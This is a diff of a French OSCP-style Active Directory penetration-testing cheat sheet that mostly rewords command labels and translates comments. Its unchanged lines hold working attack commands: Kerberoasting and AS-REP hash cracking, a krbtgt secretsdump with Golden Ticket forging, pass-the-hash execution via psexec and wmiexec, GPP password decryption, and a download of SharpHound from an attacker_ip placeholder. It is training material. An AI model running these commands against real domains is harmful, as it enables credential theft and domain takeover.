@@ -37,7 +37,7 @@ gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/su
 ```
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (LDAP) : lancer les scripts NSE « ldap* ».</p>
 
 ```bash
 nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
@@ -57,7 +57,7 @@ crackmapexec smb [domain].com -u '' -p '' --users
 ```
 
 
-<p class="oscp-command-note">Commande Impacket dans la rubrique « Reconnaissance avec Nmap ».</p>
+<p class="oscp-command-note">Énumérer les utilisateurs du domaine avec Impacket GetADUsers ou Enum4linux.</p>
 
 ```bash
 # Utilisation de GetAdUsers.py (même outil)
@@ -74,7 +74,7 @@ enum4linux -a -u "<username>" -p "<password>" <dc_ip>
 Interroger les enregistrements DNS et identifier les services associés.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (DNS) : lancer les scripts NSE « dns-brute, dns-nsid, dns-recursion ».</p>
 
 ```bash
 nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 <target_ip>
@@ -155,7 +155,7 @@ Resolve-DnsName -Name <domain_name> -Server <dns_server_ip> -DnsOnly
 Vérifier les ports et les services de la cible autorisée.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (KERBEROS) : lancer les scripts NSE « kerberos-enum-users ».</p>
 
 ```bash
 # Vérifiez la disponibilité du service Kerberos et obtenez des informations de base
@@ -178,7 +178,7 @@ GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc-ip> -format hashcat
 # Autre possibilité
 GetNPUsers.py <domain>/ -no-pass -usersfile <path_to_userlist> -dc-ip <domain_controller_ip>
 
-# Crack the found hashes
+# Tester les empreintes obtenues hors ligne
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 
 ```
@@ -189,7 +189,7 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```bash
 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <dc-ip>
 
-# Crack the resulting hash
+# Tester l'empreinte obtenue hors ligne
 hashcat -m 13100 kerberoast.txt rockyou.txt
 
 ```
@@ -231,7 +231,7 @@ hashcat -m 13100 <ticket_file> <wordlist>
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Kerberos : demander des tickets d'authentification de test.</p>
 
 ```bash
 # Demander un ticket TGT (Ticket Granting Ticket)
@@ -266,7 +266,7 @@ krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>
 
 ```bash
 # Renouveler un ticket Kerberos TGT
@@ -289,7 +289,7 @@ mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Kerberos : tester les noms de comptes du domaine avec Kerbrute.</p>
 
 ```bash
 # Essai de configurations de pré-authentification faibles
@@ -331,16 +331,16 @@ rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<doma
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
 ```bash
-# 1. Obtain KRBTGT NTLM Hash
+# 1. Obtenir le hash NTLM du compte krbtgt
 impacket-secretsdump -outputfile <dump_file> <target_domain>/<username>:<password>@<dc_ip>
 
 # 2. Generate a Golden Ticket
 ticketer -user <user> -domain <domain> -sid <domain_sid> -krbtgt <krbtgt_hash> -output <ticket_file>
 
-# 3. Use the Golden Ticket
+# 3. Utiliser le ticket Kerberos forgé dans le laboratoire.
 impacket-smbexec -target-ip <target_ip> -ticket <ticket_file> <username>
 
-# (Optional) Pass the Golden Ticket
+# Facultatif : utiliser le ticket Kerberos forgé
 impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
 
 ```
@@ -351,7 +351,7 @@ impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
 Vérifier les ports et les services de la cible autorisée.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (LDAP) : lancer les scripts NSE « ldap* ».</p>
 
 ```bash
 nmap -n -sV --script "ldap* and not brute" <target_ip>
@@ -405,10 +405,10 @@ ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=grou
 # Recherche avec authentification
 ldapsearch -h <target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>"
 
-# Searching terms
+# Filtres de recherche LDAP
 ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "[term]"
 
-# Specifies the value term to return
+# Précise le terme ou la valeur à retourner.
 ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>
 
 ```
@@ -535,7 +535,7 @@ Vérifier les ports et les services de la cible autorisée.
 nmap -v -p 139,445 [IP]
 nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ip>
 
-# NetBIOS Scan
+# Analyser les services NetBIOS
 sudo nbtscan -r 192.168.50.0/24
 
 # Vue réseau Windows
@@ -544,7 +544,7 @@ net view \\[domainName] /all
 ```
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (SMB) : lancer les scripts NSE « smb-enum-shares ».</p>
 
 ```bash
 nmap --script smb-enum-shares.nse -p445 <ip>
@@ -578,7 +578,7 @@ crackmapexec smb <dc-ip> -u '' -p '' --shares
 # Effectuer un dénombrement de session nul pour lister les utilisateurs du domaine.
 rpcclient -U "" <dc-ip> --command="enumdomusers"
 
-# Or use CME for RID cycling.
+# Autre possibilité : effectuer une énumération RID avec CrackMapExec.
 crackmapexec smb <dc-ip> --rid-brute
 
 ```
@@ -686,7 +686,7 @@ sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/
 ```
 
 
-<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>
+<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>
 
 ```bash
 # PsExec
@@ -722,7 +722,7 @@ crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
 ```
 
 
-<p class="oscp-command-note">Exécuter une commande distante via WMI.</p>
+<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>
 
 ```bash
 # Identifiants
@@ -732,8 +732,8 @@ wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
 wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
 # Vérification avec CrackMapExec
-crackmapexec wmiexec <IP> -u <USER> -p <PASSWORD>
-crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
+crackmapexec smb <IP> -u <USER> -p <PASSWORD> --exec-method wmiexec -x 'whoami'
+crackmapexec smb <IP> -u <USER> -H <NTHASH> --exec-method wmiexec -x 'whoami'
 
 ```
 
@@ -743,7 +743,7 @@ crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
 Vérifier les ports et les services de la cible autorisée.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (WINRM) : lancer les scripts NSE « winrm-info ».</p>
 
 ```bash
 nmap -p 5985,5986 --script winrm-info $IP
@@ -789,7 +789,7 @@ Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/AD_Methodology.png)
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Énumération de base ».</p>
+<p class="oscp-command-note">Afficher le SID du domaine Active Directory et le SID du compte courant.</p>
 
 ```powershell
 # Avec PowerShell
@@ -832,7 +832,7 @@ Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalNa
 # Trouver des comptes de service spécifiques (p. ex., serveur SQL)
 Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
 
-# Checking Running Services
+# Vérifier les services en cours d'exécution
 Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -ne "LocalSystem" -and $_.StartName -ne "LocalService" -and $_.StartName -ne "NetworkService" } | Select-Object Name, StartName
 # Autre possibilité
 sc queryex type= service
@@ -844,19 +844,21 @@ nltest /domain_trusts
 Get-ADServiceAccount -Filter * | Select-Object Name, ServicePrincipalNames
 
 # Utilisation de ADUC
-Open Active Directory Users and Computers and enable Advanced Features under the View menu. Browse to find service accounts.
+# Dans ADUC (interface graphique) : activer Affichage > Fonctionnalités avancées puis examiner les comptes de service.
 
 ```
 
 
-```bash
-# PowerShell
-  Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
-  
-  # Bash (Kali)
-  ldapsearch -x -h <DC_IP> -b "DC=domain,DC=com" "(&(objectClass=computer)(servicePrincipalName=*))" servicePrincipalName
-  
+**Sur Windows, dans PowerShell avec le module ActiveDirectory :**
 
+```powershell
+Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
+```
+
+**Sur Kali, avec un client LDAP et des droits de lecture :**
+
+```bash
+ldapsearch -LLL -x -H ldap://<IP_DC> -b 'DC=example,DC=local' '(&(objectClass=computer)(servicePrincipalName=*))' servicePrincipalName
 ```
 
 
@@ -876,7 +878,7 @@ net groups [groupName] /domain
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Énumération de base ».</p>
+<p class="oscp-command-note">Construire le chemin LDAP depuis le contrôleur principal et le DN du domaine.</p>
 
 ```powershell
 $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
@@ -950,7 +952,7 @@ $group
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Énumération de base ».</p>
+<p class="oscp-command-note">Annuaire : rechercher les comptes et objets visibles pour «Énumération de base».</p>
 
 ```powershell
 foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
@@ -1240,7 +1242,7 @@ Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.exe" -OutFile "C:\Temp\s
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « BloodHound &amp; SharpHound ».</p>
+<p class="oscp-command-note">Retrouver les contrôleurs de domaine avec nltest ou le module ActiveDirectory.</p>
 
 ```powershell
 # Trouvez votre nom de domaine
@@ -1288,19 +1290,21 @@ Invoke-BloodHound -CollectionMethod ACL
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Temp</code></p>
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « BloodHound &amp; SharpHound ».</p>
+<p class="oscp-command-note">Copier une archive BloodHound depuis le poste de collecte vers Kali avec les outils disponibles.</p>
+
+**Dans une session Evil-WinRM déjà ouverte sur Windows :**
+
+```text
+download C:\Temp\collecte.zip
+```
+
+**Sur Kali, si Windows héberge OpenSSH Server :**
 
 ```bash
-# Having an Evil-WinRM session
-download [bloodhound_file].zip
-
-# SCP de la victime à votre Kali
-scp user@victim-ip:C:\Temp\*.zip /path/to/your/dir
-
-# Télécharger via un serveur web
-Invoke-WebRequest -Uri "http://your-kali-ip/upload/path" -OutFile "C:\Temp\*.zip"
-
+scp etudiant@10.10.10.30:C:/Temp/collecte.zip ./collecte.zip
 ```
+
+**À ne pas confondre :** Invoke-WebRequest avec -OutFile effectue un téléchargement depuis une URL vers Windows, pas un envoi de Windows vers Kali. Pour envoyer un fichier, voir [Transferts Linux/Windows](./transferts.md).
 
 
 **Paramètres et repères :**
@@ -1612,7 +1616,7 @@ net use z:\\[hostname/domain]\SYSVOL
 <p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>\hostname.domain\Policies\{00000000-0000-0000-0000-00000000000}\MACHINE\Preferences\Groups\Groups.xml</code></p>
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Méthode principale d’extraction des mots de passe GPP».</p>
 
 ```powershell
 dir /s Groups.xml
@@ -1626,7 +1630,7 @@ type Groups.xml
 `Hash` · `cpassword`  
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « GPP Main Method for Extraction ».</p>
+<p class="oscp-command-note">GPP : décoder une valeur cpassword trouvée dans les fichiers de stratégie de groupe.</p>
 
 ```bash
 gpp-decrypt [gpp_hash/cpassword]
@@ -1638,7 +1642,7 @@ sup3r53cr3tGP0pa55
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
 ```bash
 # Vérifiez le mot de passe cpass dans le partage SYSvol pour obtenir des mots de passe clairs dans les fichiers XML.
@@ -1738,7 +1742,7 @@ crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp
 Vérifier les ports et les services de la cible autorisée.
 
 
-<p class="oscp-command-note">Exécuter un script PowerShell.</p>
+<p class="oscp-command-note">PowerShell : charger ou exécuter l'outil concerné par «Importer le module».</p>
 
 ```powershell
 powershell -ExecutionPolicy Bypass
@@ -1925,7 +1929,7 @@ SharpHound.exe -c All
 `ReadProperty` · `msDS-ManagedPassword`  
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Localiser les fichiers correspondant aux critères indiqués.</p>
 
 ```text
 Find Principals with Unusual Rights on Password Attributes
@@ -1949,7 +1953,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `GMSAPasswordReader.exe`  
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Usage ».</p>
+<p class="oscp-command-note">gMSA : lire les données du compte ciblé avec GMSAPasswordReader, si l'accès le permet.</p>
 
 ```powershell
 .\GMSAPasswordReader.exe --AccountName [GMSA_ACCOUNT_NAME]
@@ -2038,7 +2042,7 @@ nxc smb <IP_DC> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>' -d '<DOMAINE_AD>' -M gpp_
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Exécuter un script PowerShell.</p>
+<p class="oscp-command-note">PowerShell : charger ou exécuter l'outil concerné par «Exploitation des stratégies de groupe (GPO)».</p>
 
 ```powershell
 powershell -ExecutionPolicy bypass
@@ -2330,7 +2334,7 @@ nmap -p 88,135,139,389,445,636,3268,3389 -sC -sV -Pn <DOMAIN_IP>
 ```
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (SMB) : lancer les scripts NSE « smb-enum-shares, smb-enum-users ».</p>
 
 ```bash
 nmap --script smb-enum-shares,smb-enum-users -p445 <DOMAIN_IP>
@@ -2351,7 +2355,7 @@ nmap --script ldap-search -p389 <DOMAIN_IP>
 <p class="oscp-command-note">Examiner les comptes Kerberos du domaine.</p>
 
 ```bash
-# A good wordlist of usernames is /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
+# Exemple de liste de noms d'utilisateurs disponible :
 kerbrute userenum --dc <DOMAIN_IP> -d [domain].com userlist.txt
 
 ```
@@ -2386,7 +2390,7 @@ Get-ADGroup -Filter * | Select-Object Name, GroupScope
 ### Conseils d’énumération avec CrackMapExec
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (SMB) : lancer les scripts NSE « smb-os-discovery ».</p>
 
 ```bash
 nmap -p 445 --script smb-os-discovery <IP_RANGE>
